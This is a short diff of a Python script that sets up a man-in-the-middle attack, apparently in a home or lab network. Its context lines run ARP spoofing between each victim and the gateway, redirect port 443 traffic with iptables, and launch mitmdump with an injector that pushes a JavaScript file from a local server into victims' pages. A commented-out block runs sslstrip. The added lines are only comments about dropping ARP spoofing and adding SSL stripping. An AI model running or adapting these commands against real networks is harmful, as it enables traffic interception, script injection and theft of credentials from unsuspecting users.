@@ -17,6 +17,7 @@ os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRE
 
 
 # run the arpspoof for each victim, each one in a new console
+# in our case we don't need ARP spoof, http server on rasberry pi
 for victim in victims:
     os.system("xterm -e arpspoof -i eth0 -t " + victim + " " + gateway + " &")
     os.system("xterm -e arpspoof -i eth0 -t " + gateway + " " + victim + " &")
@@ -27,7 +28,7 @@ os.system("xterm -hold -e 'python3 httpServer.py' &")
 # start the mitmproxy
 os.system("~/.local/bin/mitmdump -s 'injector.py http://192.168.1.32:8000/script.js' -T")
 
-
+## Set up SSl strip here
 '''
 # run sslstrip
 os.system("xterm -e sslstrip -l 8080 &")
